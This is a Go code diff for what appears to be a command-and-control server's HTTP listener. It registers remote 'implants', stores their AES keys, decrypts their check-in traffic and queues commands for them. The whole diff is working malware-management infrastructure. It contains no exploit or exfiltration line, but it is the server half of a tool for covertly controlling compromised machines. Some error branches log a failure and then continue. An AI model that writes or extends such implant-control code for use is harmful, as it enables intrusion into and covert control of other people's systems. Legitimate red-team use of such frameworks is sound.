@@ -22,7 +22,7 @@ type LS struct {
 }
 
 var (
-	agent_arr      []Common.Implant
+	agent_arr      []*Common.Implant
 	g_clientobj    Common.Client
 	gAgentCmdQueue Common.Queue
 )
@@ -32,6 +32,7 @@ func ProcessRequest(c *gin.Context) {
 		decryptedPayload []byte
 		AESKey           []byte
 		IV               []byte
+		data_package     Common.Package
 	)
 	body, err := io.ReadAll(c.Request.Body)
 	if err != nil {
@@ -39,51 +40,92 @@ func ProcessRequest(c *gin.Context) {
 	}
 	defer c.Request.Body.Close()
 
-	var data_package Common.Package
 	err = data_package.UnmarshalHeader(body)
-	if err != nil {
-		log.Println("[Error] attempting to read data from http request", err)
+	if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
+		log.Println("[error] attempting to unmarshal header", err)
 		c.JSON(http.StatusInternalServerError, "Internal Server Error")
 	}
 
 	switch data_package.CmdID {
 	case Common.CMD_Register:
 		var (
-			NewImplant Common.Implant
+			NewImplant *Common.Implant
+			Registered bool
 		)
 
-		err = data_package.UnmarshalEncryptedMetaData(body)
-		if err != nil {
-			log.Println("[error] attempting to unmarshal encrypted metadata")
-			c.JSON(http.StatusInternalServerError, "Internal Server Error")
-		}
-
-		decryptedPayload, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
-		if err != nil {
-			log.Println("[error] attempting to decrypt payload")
-			c.JSON(http.StatusInternalServerError, "Internal Server Error")
-		}
-
-		NewImplant.ImplantName = data_package.AgentName
-		NewImplant.AESKey = AESKey
-		NewImplant.IV = IV
-		NewImplant.Alive = true
-
-		agent_arr = append(agent_arr, NewImplant)
-
-		go func() {
-			err = RegisterAgent(decryptedPayload)
-			if err != nil {
-				log.Println("[error] attempting to initialize agent", err)
+		//check if implant is already registered
+		for _, agent := range agent_arr {
+			if agent.ImplantName == data_package.AgentName {
+				if agent.AESKey != nil && agent.IV != nil && agent.Context.User_name != "" {
+					log.Println("[info] implant already registered")
+					c.JSON(http.StatusOK, "")
+					Registered = true // if we're already registered, we don't need to do anything else
+					break
+				}
 			}
-		}()
-		break //CMD_Register
+		}
+		if Registered {
 
+			break // break out of switch. We're already registered
+
+		} else { // if we're not registered, we need to register
+			err = data_package.UnmarshalEncryptedMetaData(body)
+			if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
+				log.Println("[error] attempting to unmarshal header", err)
+				c.JSON(http.StatusInternalServerError, "Internal Server Error")
+
+			}
+
+			decryptedPayload, AESKey, IV, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
+			if err != nil {
+				log.Println("[error] attempting to decrypt payload")
+				c.JSON(http.StatusInternalServerError, "Internal Server Error")
+			}
+			NewImplant = &Common.Implant{
+				ImplantName: data_package.AgentName,
+				AESKey:      AESKey,
+				IV:          IV,
+				Alive:       true,
+				Context:     Common.ImplantContext{},
+			}
+
+			agent_arr = append(agent_arr, NewImplant)
+
+			go func() {
+				err = RegisterAgent(NewImplant, decryptedPayload)
+				if err != nil {
+					log.Println("[error] attempting to initialize agent", err)
+				}
+			}()
+			break //CMD_Register
+		}
 	case Common.CMD_GET_JOB:
-		//TODO WRITE THE DATA PARSER FOR DATA WE RECEIVE DURING CHECKIN.
 		var (
 			AgentCmd Common.AgentCmd
 		)
+
+		if len(agent_arr) == 0 {
+			AgentCmd.CmdID = Common.CMD_Register
+			AgentCmd.RequestID = data_package.RequestID + 1
+			AgentCmd.DataBuffer = nil
+			gAgentCmdQueue.PreemptQueue(AgentCmd)
+		}
+
+		//parse data
+		err = data_package.UnmarshalEncryptedData(body)
+		if err == nil {
+			for _, agent := range agent_arr {
+				if agent.ImplantName == data_package.AgentName {
+					//TODO DO SOMETHING WITH DECRYPTED DATA
+					decryptedPayload = Crypt.AES256CTR(data_package.EncryptedData, agent.AESKey, agent.IV)
+					break
+				}
+			}
+
+		} else if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
+			log.Println("[error] attempting to unmarshal header", err)
+			c.JSON(http.StatusInternalServerError, "Internal Server Error")
+		}
 
 		if len(gAgentCmdQueue) == 0 {
 
